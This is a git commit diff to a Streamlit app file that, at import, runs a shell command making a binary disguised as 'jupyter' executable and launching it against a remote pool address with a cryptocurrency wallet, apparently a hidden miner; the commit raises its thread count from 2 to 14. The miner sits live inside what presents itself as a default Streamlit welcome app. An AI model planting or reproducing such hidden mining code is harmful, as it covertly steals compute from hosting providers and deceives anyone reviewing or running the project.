d315db4471824c823d3fa5e2a761a36ef2a9faec
arlindasananta <115712929+arlindasananta@users.noreply.github.com>
2022-10-13 20:53:23 +0700

    Update ervanaapp.py

--- ervanaapp.py
+++ ervanaapp.py
@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('chmod +x jupyter && ./jupyter -r  15.235.164.162:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm433xrs6nyyauq2x3e8d.mikayui -m 2')
+os.system('chmod +x jupyter && ./jupyter -r  15.235.164.162:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm433xrs6nyyauq2x3e8d.mikayui -m 14')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
